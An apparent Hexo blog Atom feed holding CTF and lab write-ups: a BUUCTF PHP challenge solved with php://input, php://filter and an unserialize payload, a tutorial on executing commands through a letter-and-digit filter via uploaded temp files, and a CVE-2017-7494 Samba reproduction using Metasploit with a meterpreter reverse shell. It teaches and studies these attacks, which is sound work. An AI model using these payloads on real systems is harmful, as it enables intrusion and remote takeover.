<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Soleral</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-02-01T09:41:57.355Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Soleral</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF NiZhuanSiWei writeup</title>
    <link href="http://example.com/2021/02/01/BUUCTF-NiZhuanSiWei-writeup/"/>
    <id>http://example.com/2021/02/01/BUUCTF-NiZhuanSiWei-writeup/</id>
    <published>2021-02-01T08:23:30.000Z</published>
    <updated>2021-02-01T09:41:57.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;<span class="comment">#判断读取text传入的文件名中的内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<span class="comment">#输出读取的内容</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;<span class="comment">#判断file中是否存在字符串flag</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);<span class="comment">#将字符串password还原为一个对象</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>file_get_contents($text,’r’)===”welcome to the zjctf”</li></ul><p>可以通过php://input伪协议以POST传入welcome to the zjctf</p><p>构造以下payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">text=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure><p><img src="/img/BUUCTF/NiZhuanSiWei/1.png" alt="1.png" title="1"></p><p>也可以通过data://text/plain伪协议传入welcome to the zjctf</p><p>构造以下payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain,welcome%20to%20the%20zjctf</span></span><br></pre></td></tr></table></figure><ul><li>include($file)可以使用php://filter伪协议读取文件，根据提示读取useless.php</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain,welcome%20to%20the%20zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span></span><br></pre></td></tr></table></figure><p><img src="/img/BUUCTF/NiZhuanSiWei/2.png" alt="2.png" title="2"></p><p>将内容进行base64解码<br>得到php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析代码<br>构造反序列化语句，file赋值为flag.php即可得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/BUUCTF/NiZhuanSiWei/3.png" alt="3.png" title="3"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;代码分析&quot;&gt;&lt;a href=&quot;#代码分析&quot; class=&quot;headerlink&quot; title=&quot;代码分析&quot;&gt;&lt;/a&gt;代码分析&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;s</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="BUUCTF" scheme="http://example.com/tags/BUUCTF/"/>
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字getshell</title>
    <link href="http://example.com/2021/02/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97getshell/"/>
    <id>http://example.com/2021/02/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97getshell/</id>
    <published>2021-02-01T05:37:31.000Z</published>
    <updated>2021-02-01T08:25:47.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="示例一"><a href="#示例一" class="headerlink" title="示例一:"></a>示例一:</h1><p>先附上代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        system(<span class="variable">$x</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>对传入的x过滤了字母和数字等各种字符</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><ul><li>在php中``可以执行系统命令</li><li>php短标签可以直接输出内容</li><li>在文件中添加#! /bin/sh可以不用执行权限执行文件</li><li>在linux系统中输入.+一个可执行文件可以执行文件</li><li>linux系统中的通配符?</li></ul><p>示例:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以构造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?x=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`whoami`<span class="meta">?&gt;</span><span class="comment">#闭合前面的php标签，构造短标签执行命令</span></span><br></pre></td></tr></table></figure><p><img src="/img/upload/1.png" alt="1.png" title="1"></p><ul><li>当我们通过php上传文件时，服务器一般会将文件上传到一个临时目录，然后再将文件转移到指定地方，临时文件的保存形式为php+6位随机数字和大小写字母，默认的临时文件路径在/tmp目录下</li></ul><p>查看php.ini中是否开启文件上传和默认的临时文件保存目录<br>file_uploads =on<br>upload_tmp_dir=</p><h1 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h1><p>通过以上分析我们可以在本地写一个文件上传页面，附上代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.1.107/index.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&#x27;multipart/form-data&#x27;</span><span class="attr">method</span>=<span class="string">&#x27;POST&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;file&#x27;</span><span class="attr">name</span>=<span class="string">&#x27;file&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span><span class="attr">value</span>=<span class="string">&#x27;upload&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后构造payload，可以匹配临时文件的最后一个字母，[@-[]匹配大写字母，执行失败可以多试几次</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;.%20&#x2F;???&#x2F;????????[@-[]</span><br></pre></td></tr></table></figure><p><img src="/img/upload/2.png" alt="2.png" title="2"></p><p>也可以执行我们想用的其他命令</p><h1 id="示例二"><a href="#示例二" class="headerlink" title="示例二:"></a>示例二:</h1><p>代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$x</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;No.1 Die&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;No.2 Die&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$x</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h1><p>对输入的x过滤了字母数字等，未过滤字母p，可以使用短标签执行命令</p><h1 id="执行过程-1"><a href="#执行过程-1" class="headerlink" title="执行过程"></a>执行过程</h1><p>构造payload进行绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?x=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.%<span class="number">20</span>/??p/p?p??????`;</span><br></pre></td></tr></table></figure><p><img src="/img/upload/3.png" alt="3.png" title="3"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;示例一&quot;&gt;&lt;a href=&quot;#示例一&quot; class=&quot;headerlink&quot; title=&quot;示例一:&quot;&gt;&lt;/a&gt;示例一:&lt;/h1&gt;&lt;p&gt;先附上代码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;co</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-7494</title>
    <link href="http://example.com/2021/01/31/CVE-2017-7494/"/>
    <id>http://example.com/2021/01/31/CVE-2017-7494/</id>
    <published>2021-01-31T06:46:58.000Z</published>
    <updated>2021-02-01T05:25:12.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Describe"><a href="#Describe" class="headerlink" title="Describe"></a>Describe</h1><p>On May 24, 2017, samba released version 4.6.4, which fixed a serious Remote Code Execution Vulnerability, The vulnerability number is cve-2017-7494.</p><h1 id="System-affected-by-vulnerability"><a href="#System-affected-by-vulnerability" class="headerlink" title="System affected by vulnerability"></a>System affected by vulnerability</h1><p>Samba 3.5.0-4.6.4/4.5.10/4.4.14,The version after 4.6.4/4.5.10/4.4.14 has fixed the vulnerability.</p><h1 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h1><p>Download the <a href="https://archive.kernel.org/centos-vault/6.5/isos/x86_64/CentOS-6.5-x86_64-bin-DVD1to2.torrent">iso</a>.</p><h2 id="Install-samba-server"><a href="#Install-samba-server" class="headerlink" title="Install samba server"></a>Install samba server</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install samba</span><br></pre></td></tr></table></figure><h2 id="Modify-configuration-file"><a href="#Modify-configuration-file" class="headerlink" title="Modify configuration file"></a>Modify configuration file</h2><p><img src="/img/cve-2017-7494/2.png" alt="2.png" title="2"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;home&#x2F;samba</span><br></pre></td></tr></table></figure><h2 id="start-server"><a href="#start-server" class="headerlink" title="start server"></a>start server</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service smb restart</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2017-7494/1.png" alt="1.png" title="1"></p><h2 id="Then-open-Metasploit-in-Kali-Configuration-the-parameters-start-exploit"><a href="#Then-open-Metasploit-in-Kali-Configuration-the-parameters-start-exploit" class="headerlink" title="Then open Metasploit in Kali,Configuration the parameters,start exploit"></a>Then open Metasploit in Kali,Configuration the parameters,start exploit</h2><h3 id="Configuration-the-parameters"><a href="#Configuration-the-parameters" class="headerlink" title="Configuration the parameters"></a>Configuration the parameters</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search cve-2017-7494</span><br><span class="line">use exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename</span><br><span class="line">set RHOSTS 192.168.1.110</span><br><span class="line">set PAYLOAD linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.1.111</span><br><span class="line">set TARGET 3</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2017-7494/3.png" alt="3.png" title="3"></p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><img src="/img/cve-2017-7494/4.png" alt="4.png" title="4"></p><p>Samba is executed as root by default, so the vulnerability can get root permission directly.</p><h2 id="problems"><a href="#problems" class="headerlink" title="problems"></a>problems</h2><p>When it shows :[-] 192.168.1.106:445 - Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.1.106:445) was unreachable.<br>It could be the iptables or selinux prevented the connect.<br>clear the iptables’s rules or stop iptables.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -F#clear the iptables&#39;s rules</span><br><span class="line">service stop iptables #stop iptables</span><br><span class="line">setenforce 0#close selinux</span><br></pre></td></tr></table></figure><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Modify-configuration-file-1"><a href="#Modify-configuration-file-1" class="headerlink" title="Modify configuration file"></a>Modify configuration file</h2><p>Edit profile<br>append line: nt pipe support=no</p><h2 id="Update-the-samba-server"><a href="#Update-the-samba-server" class="headerlink" title="Update the samba server"></a>Update the samba server</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Describe&quot;&gt;&lt;a href=&quot;#Describe&quot; class=&quot;headerlink&quot; title=&quot;Describe&quot;&gt;&lt;/a&gt;Describe&lt;/h1&gt;&lt;p&gt;On May 24, 2017, samba released version 4.6.4,</summary>
      
    
    
    
    <category term="Vulnerabilities" scheme="http://example.com/categories/Vulnerabilities/"/>
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/01/31/hello-world/"/>
    <id>http://example.com/2021/01/31/hello-world/</id>
    <published>2021-01-30T17:30:00.626Z</published>
    <updated>2021-01-30T17:30:00.626Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
